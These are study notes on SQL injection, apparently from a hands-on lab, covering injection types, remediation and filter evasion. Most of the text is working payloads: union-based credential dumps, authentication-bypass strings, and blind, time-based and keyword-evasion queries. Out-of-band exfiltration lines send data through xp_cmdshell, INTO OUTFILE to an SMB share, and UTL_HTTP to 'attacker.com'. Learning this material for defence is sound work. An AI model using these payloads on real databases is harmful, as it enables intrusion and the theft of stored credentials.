## SQL BASICS 

- select * from  users;

-  insert into users (username,password) values ('user','password') ---> for inserting data into tables 

-  update users set  username='root',password='pass123' where username='admin' ; ---> updating database

- For deleting anything we can use delete from users where username='admin' ; 


## SQL Injection

### Types of SQL Injections
1) In-Band SQLi
	- In-Band SQL Injection ---> easily exploitable and gives result 
	- Error-Based SQL Injection --->  as error messages from the database are printed directly to the browser screen.
	- Union-Based SQL Injection ---> uses union operator to retrieve database
	
	- #### Examples
	- database()
	- For tables --->   ?id=0 union select 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
	- For columns --->  ?id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
	- Final Step ---> group_concat(username,':',password) FROM staff_users

2) Blind SQLi - Authentication Bypass
	  - We can see results directly on the screen . no error msgs shown in web 

	- ### Examples
	- ' OR 1=1;--
	- ' OR 1=1 LIMIT 1-- -'

3) Blind SQLi - Boolean Based  (very time consuming)   no visual indicator or result shown 
	- response could be true/false 0/1 or something logical that have only two conditions or outcomes
	-  admin' union select 1,2,3;--
	- admin123' UNION SELECT 1,2,3 where database() like 's%';--  

4) Blind SQLi - Time Based
	-  admin123' UNION SELECT SLEEP(5);--
	- referrer=admin123' UNION SELECT SLEEP(5),2 from users where username like ‘admin’ and password like ‘4961’;

5) Out-of-Band SQLi
	 - depends on external force means depends on business logic 

## Remediation

1) Prepared Statements (With Parameterized Queries)
	- -> Developer writes SQL querys --> then user inputs added as parameters 
	- -->makes much easier code and easier to read
	
2) Input Validation
	-->  make changes on input logic where input logic is manipulated being fix
	
3) Escaping User Input
	--> Allowing user input containing characters such as ' " $ \ can cause SQL Queries to break or, even worse, as we've learnt, open them up for injection attacks. Escaping user input is the method of prepending a backslash (\) to these characters, which then causes them to be parsed just as a regular string and not a special character.


## Advanced

1) Second-Order SQL Injection
	--> Also known as stored SQL injection
	--> exploits vulnerabilities where user-supplied input is saved and subsequently used in        a different part of the application, possibly after some initial processing.
	--> harder to detect
	--> *Can bypass front end defances*

2) Filter Evasion Techniques
	--> URL Encoding
	--> Hexadecimal Encoding
	--> Unicode Encoding

	* No-Quote SQL Injection Technique
	-->  used when the application filters single or double quotes or escapes.
		1) **Using Numerical Values**: --> instead of ' OR '1'='1 this we can use OR 1=1              use values or data types that  does not require quotes
		2) **Using SQL Comments**: -->  admin'-- -> admin--                                                  using sql comments  
		3) **Using CONCAT() Function**: --> CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e) 

	--> No Spaces Allowed 

	- **Comments to Replace Spaces**: `use sql comments '/**/' to replace spaces`
	- **Tab or Newline Characters**:` use \t (tab) or \n (newline) in place of             space you can use SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t'admin'`
	  - **Alternate Characters**:`whitespace, such as `%09` (horizontal tab), `%0A` (line feed), `%0C` (form feed), `%0D` (carriage return), and `%A0` (non-breaking space).'

|                                                              |                                                                                                                  |                                                                                                         |
| ------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------- |
| **Scenario**                                                 | **Description**                                                                                                  | **Example**                                                                                             |
| **Keywords like SELECT are banned**                          | SQL keywords can often be bypassed by changing their case or adding inline comments to break them up             | SElEcT * FrOm users or SE/**/LECT * FROM/**/users                                                       |
| **Spaces are banned**                                        | Using alternative whitespace characters or comments to replace spaces can help bypass filters.                   | SELECT%0A*%0AFROM%0Ausers or SELECT/**/*/**/FROM/**/users                                               |
| **Logical operators like AND, OR are banned**                | Using alternative logical operators or concatenation to bypass keyword filters.                                  | username = 'admin' && password = 'password' or username = 'admin'/**/\|/**/1=1 --                       |
| **Common keywords like UNION, SELECT are banned**            | Using equivalent representations such as hexadecimal or Unicode encoding to bypass filters.                      | SElEcT * FROM users WHERE username = CHAR(0x61,0x64,0x6D,0x69,0x6E)                                     |
| **Specific keywords like OR, AND, SELECT, UNION are banned** | Using obfuscation techniques to disguise SQL keywords by combining characters with string functions or comments. | SElECT * FROM users WHERE username = CONCAT('a','d','m','i','n') or SElEcT/**/username/**/FROM/**/users |

- **Out-of-band SQL Injection:**
---> does not relay on same channel 
---> security mechanisms like  **stored procedures**, **output encoding**, and **application-                      level constraints** can **prevent direct responses**
---> **Intrusion Detection Systems (IDS)** and **Web Application Firewalls (WAFs)** often                       **monitor and log SQL query responses for suspicious activity**,

- on mysql and mariaDB 
	-- SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';  
	-- by select and into outfile file writing commands 

- on mssql 
	-- `EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';`

- oracle
	-- `DECLARE req UTL_HTTP.REQ; resp UTL_HTTP.RESP; BEGIN req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data); UTL_HTTP.GET_RESPONSE(req); END;`
	
	-- uses  **UTL_HTTP**  **UTL_FILE**
	-- make smb server --> impacket-smbserver -smb2support -comment "My Logs Server" -debug logs /tmp 
	-- after go to victim url --> `1'; SELECT @@version INTO OUTFILE '\\\\ATTACKBOX_IP\\logs\\out.txt'; --`

3) **Other Techniques**
	- HTTP Header Injection 
	  --> User-Agent: ' OR 1=1; --
	  --> uses curl to exploit -> curl -H "User-Agent: ' UNION SELECT username, password FROM user; # " http://10.10.41.188/httpagent/
	  
	
4) **Major Issues During Identification**
	- **Dynamic Nature of SQL Queries**:
	- **Variety of Injection Points**:
	- **use of security measures**
	- **Context-Specific Detection** 
	
